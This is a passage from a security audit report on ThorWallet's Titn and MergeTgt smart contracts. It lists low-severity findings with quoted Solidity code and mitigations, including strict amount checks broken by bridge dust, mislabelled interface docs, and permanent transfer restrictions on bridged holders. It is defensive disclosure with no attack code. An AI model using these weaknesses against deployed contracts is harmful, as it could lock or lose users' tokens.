<pre data-index="14" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">Titn</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">OFT</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">constructor</span><span class="mtk1">(</span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_name</span><span class="mtk1">, </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">_symbol</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_lzEndpoint</span><span class="mtk1">, </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_delegate</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">initialMintAmount</span><span class="mtk1">) </span><span class="mtk11">OFT</span><span class="mtk1">(</span><span class="mtk12">_name</span><span class="mtk1">, </span><span class="mtk12">_symbol</span><span class="mtk1">, </span><span class="mtk12">_lzEndpoint</span><span class="mtk1">, </span><span class="mtk12">_delegate</span><span class="mtk1">)</span></span></span></code></pre>
<p>MergeTgt requires exact amounts:</p>
<pre data-index="15" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">constant</span><span class="mtk1"> </span><span class="mtk12">TITN_ARB</span><span class="mtk1"> = </span><span class="mtk7">173_700_000</span><span class="mtk1"> * </span><span class="mtk7">10</span><span class="mtk1"> ** </span><span class="mtk7">18</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amount</span><span class="mtk1"> != </span><span class="mtk12">TITN_ARB</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">InvalidAmountReceived</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Due to OFT’s dust removal, bridged amounts may be slightly less than expected, causing transaction failures or minor token losses.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-3"><a class="anchor before" aria-label="recommended mitigation steps 3 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Add tolerance for deposit amounts.</p>
<h2 style="position:relative;" id="qa-02-interface-documentation-references-wrong-token-standard"><a class="anchor before" aria-label="qa 02 interface documentation references wrong token standard permalink" href="https://code4rena.com/reports/2025-02-thorwallet#qa-02-interface-documentation-references-wrong-token-standard"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[QA-02] Interface Documentation References Wrong Token Standard</h2>
<h3 style="position:relative;" id="finding-description-and-impact-3"><a class="anchor before" aria-label="finding description and impact 3 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#finding-description-and-impact-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>The <code>IERC677Receiver</code> interface documentation incorrectly references <code>ERC1363</code> instead of <code>ERC677</code>. This mismatch between the interface name and its documentation could lead to integration issues and developer confusion.</p>
<p>The interface is named <code>IERC677Receiver</code> but its documentation comments reference <code>ERC1363</code>’s <code>transferAndCall</code> functionality. While both standards have similar purposes, they have different implementations and requirements. This inconsistency could cause:</p>
<ul>
<li>Integration errors if developers implement the wrong standard based on the documentation</li>
<li>Confusion during code review and maintenance</li>
<li>Potential compatibility issues with other contracts expecting specific standard implementations
The impact is low, as this is primarily a documentation issue and does not affect the actual functionality of the code.</li>
</ul>
<h3 style="position:relative;" id="proof-of-concept-3"><a class="anchor before" aria-label="proof of concept 3 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#proof-of-concept-3"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>The interface in <a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/interfaces/IERC677Receiver.sol#L5-L6">IERC677Receiver.sol</a>:</p>
<pre data-index="16" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">/**</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3"> * </span><span class="mtk4">@title</span><span class="mtk3"> IERC1363Receiver</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3"> * </span><span class="mtk4">@dev</span><span class="mtk3"> Interface for any contract that wants to support </span><span class="mtk8">`transferAndCall`</span><span class="mtk3"> or </span><span class="mtk8">`transferFromAndCall`</span><span class="mtk3"> from ERC-1363 token contracts.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3"> */</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IERC677Receiver</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">onTokenTransfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">value</span><span class="mtk1">, </span><span class="mtk12">bytes</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">data</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>The interface is used in <code>MergeTgt.sol</code> for handling token transfers, but it’s implementing ERC677 functionality despite the ERC1363 documentation:</p>
<pre data-index="17" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">IERC677Receiver</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"./interfaces/IERC677Receiver.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">MergeTgt</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">IMerge</span><span class="mtk1">, </span><span class="mtk12">Ownable</span><span class="mtk1">, </span><span class="mtk12">ReentrancyGuard</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">onTokenTransfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">bytes</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">extraData</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">nonReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-4"><a class="anchor before" aria-label="recommended mitigation steps 4 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ul>
<li>Update the interface documentation to correctly reference ERC677.</li>
</ul>
<h2 style="position:relative;" id="qa-03-use-of-non-standard-erc-677-token-interface"><a class="anchor before" aria-label="qa 03 use of non standard erc 677 token interface permalink" href="https://code4rena.com/reports/2025-02-thorwallet#qa-03-use-of-non-standard-erc-677-token-interface"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[QA-03] Use of Non-Standard ERC-677 Token Interface</h2>
<h3 style="position:relative;" id="finding-description-and-impact-4"><a class="anchor before" aria-label="finding description and impact 4 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#finding-description-and-impact-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding Description and Impact</h3>
<p>The protocol implements the ERC-677 token standard, which is not an officially finalized ERC standard. This introduces several risks:</p>
<ol>
<li>The standard could change or be deprecated since it’s not finalized</li>
<li>Limited tooling and library support due to non-standardization</li>
</ol>
<h3 style="position:relative;" id="proof-of-concept-4"><a class="anchor before" aria-label="proof of concept 4 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#proof-of-concept-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>
<p>The protocol implements <a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/interfaces/IERC677Receiver.sol#L8-L9"><code>IERC677Receiver</code></a> interface:</p>
<pre data-index="18" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// In IERC677Receiver.sol</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IERC677Receiver</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">onTokenTransfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">value</span><span class="mtk1">, </span><span class="mtk12">bytes</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">data</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
</li>
<li>This interface is used in <a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L64-L65"><code>MergeTgt.sol</code></a>.</li>
<li>ERC-677 is not listed in the final or last call standards on <a href="https://eips.ethereum.org/erc">https://eips.ethereum.org/erc</a>.</li>
</ol>
<h3 style="position:relative;" id="recommended-mitigation-steps-5"><a class="anchor before" aria-label="recommended mitigation steps 5 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ul>
<li>Consider migrating to the more standardized EIP-1363 (ERC-1363), which provides similar functionality but is better specified and maintained.</li>
</ul>
<h2 style="position:relative;" id="qa-04-setter-functions-dont-check-for-value-changes"><a class="anchor before" aria-label="qa 04 setter functions dont check for value changes permalink" href="https://code4rena.com/reports/2025-02-thorwallet#qa-04-setter-functions-dont-check-for-value-changes"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[QA-04] Setter Functions Don’t Check for Value Changes</h2>
<p>This issue results in unnecessary event emissions when setting values that are already at the desired value.</p>
<h3 style="position:relative;" id="proof-of-concept-5"><a class="anchor before" aria-label="proof of concept 5 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#proof-of-concept-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>The following setter functions do not check if the new value differs from the current value:</p>
<ul>
<li><a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L167-L168">setLockedStatus</a></li>
<li><a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L172-L173">setLaunchTime</a></li>
<li><a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L33-L34">setTransferAllowedContract</a></li>
<li><a href="https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L43-L44">setBridgedTokenTransferLocked</a></li>
</ul>
<h3 style="position:relative;" id="recommended-mitigation-steps-6"><a class="anchor before" aria-label="recommended mitigation steps 6 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<ul>
<li>Add checks to compare new values with current values before performing the update and emitting events.</li>
</ul>
<h2 style="position:relative;" id="qa-05-permanent-transfer-restrictions-on-bridged-tokens-due-to-immutable-isbridgedtokenholder-mapping"><a class="anchor before" aria-label="qa 05 permanent transfer restrictions on bridged tokens due to immutable isbridgedtokenholder mapping permalink" href="https://code4rena.com/reports/2025-02-thorwallet#qa-05-permanent-transfer-restrictions-on-bridged-tokens-due-to-immutable-isbridgedtokenholder-mapping"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[QA-05] Permanent transfer restrictions on bridged tokens due to immutable isBridgedTokenHolder mapping</h2>
<p><strong>Impact</strong></p>
<p>High. Addresses marked as bridged token holders cannot be unmarked, potentially leading to permanently locked tokens, even in legitimate cases.</p>
<p><strong>Vulnerability Details</strong></p>
<p>In the Titn contract, addresses that receive bridged tokens are permanently marked in the isBridgedTokenHolder mapping with no way to remove them:</p>
<pre data-index="19" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">mapping</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk4">=&gt;</span><span class="mtk1"> </span><span class="mtk12">bool</span><span class="mtk1">) </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">isBridgedTokenHolder</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_credit</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_amountLD</span><span class="mtk1">, </span><span class="mtk12">uint32</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// ... other logic ...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Addresses that bridged tokens have some transfer restrictions</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (!</span><span class="mtk12">isBridgedTokenHolder</span><span class="mtk1">[</span><span class="mtk12">_to</span><span class="mtk1">]) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">isBridgedTokenHolder</span><span class="mtk1">[</span><span class="mtk12">_to</span><span class="mtk1">] = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">_amountLD</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>These addresses are then restricted from transferring tokens:</p>
<pre data-index="20" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_validateTransfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">from</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">from</span><span class="mtk1"> != </span><span class="mtk11">owner</span><span class="mtk1">() &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">from</span><span class="mtk1"> != </span><span class="mtk12">transferAllowedContract</span><span class="mtk1"> &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">to</span><span class="mtk1"> != </span><span class="mtk12">transferAllowedContract</span><span class="mtk1"> &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">isBridgedTokensTransferLocked</span><span class="mtk1"> &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span><span class="mtk12">isBridgedTokenHolder</span><span class="mtk1">[</span><span class="mtk12">from</span><span class="mtk1">] || </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">chainid</span><span class="mtk1"> == </span><span class="mtk12">arbitrumChainId</span><span class="mtk1">) &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">to</span><span class="mtk1"> != </span><span class="mtk12">lzEndpoint</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">BridgedTokensTransferLocked</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>This creates several issues:</p>
<ul>
<li>No way to correct mistakenly marked addresses</li>
<li>No way to remove restrictions after legitimate bridging</li>
<li>Contract upgrades or migrations become complicated</li>
<li>Users who receive bridged tokens are permanently restricted</li>
</ul>
<h3 style="position:relative;" id="proof-of-concept-6"><a class="anchor before" aria-label="proof of concept 6 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#proof-of-concept-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<ol>
<li>User A bridges tokens from chain X to Arbitrum.</li>
<li>User A’s address is marked as isBridgedTokenHolder.</li>
<li>User A sends tokens back to chain X.</li>
<li>User A receives new tokens on Arbitrum through legitimate means.</li>
<li>User A cannot transfer these new tokens due to permanent restriction.</li>
</ol>
